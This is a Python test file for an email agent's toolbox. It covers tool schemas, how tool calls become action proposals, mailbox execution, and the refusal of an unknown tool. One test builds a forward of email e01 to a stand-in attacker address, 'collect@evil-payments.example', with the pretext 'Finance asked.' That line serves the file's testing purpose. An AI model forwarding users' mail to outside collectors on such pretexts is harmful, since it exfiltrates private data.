import pytest

from app.agent.tools import TOOLS, ToolBox
from app.contracts import ActionType
from app.mailbox import Mailbox


def test_tool_names_and_schemas():
    assert [t["name"] for t in TOOLS] == ["list_emails", "read_email", "label_email",
                                          "move_email", "reply_email", "forward_email"]
    assert all(t["input_schema"]["type"] == "object" for t in TOOLS)


def test_reading_marks_context_and_action_calls_become_proposals():
    tb = ToolBox(Mailbox())
    assert len(tb.read_only("list_emails", {})) == 10 and tb.read == []
    tb.read_only("read_email", {"email_id": "e01"})
    tb.read_only("read_email", {"email_id": "e09"})
    tb.read_only("read_email", {"email_id": "e01"})
    a = tb.to_action("forward_email", {"email_id": "e01", "to": "collect@evil-payments.example",
                                       "rationale": "Finance asked."})
    assert a.type is ActionType.FORWARD and a.params == {"to": ["collect@evil-payments.example"]}
    assert a.context_email_ids == ["e01", "e09"] and a.rationale == "Finance asked."


def test_every_action_tool_maps_and_executes():
    mb = Mailbox()
    tb = ToolBox(mb)
    calls = [("label_email", {"email_id": "e01", "label": "invoice"}),
             ("move_email", {"email_id": "e05", "folder": "newsletters"}),
             ("reply_email", {"email_id": "e04", "body": "Works for me."}),
             ("forward_email", {"email_id": "e01", "to": ["accounting@acme.example"]})]
    for name, args in calls:
        mb.execute(tb.to_action(name, args))
    assert len(mb.outbox) == 2


def test_unknown_tool_is_refused():
    with pytest.raises(ValueError):
        ToolBox(Mailbox()).to_action("delete_everything", {"email_id": "e01"})
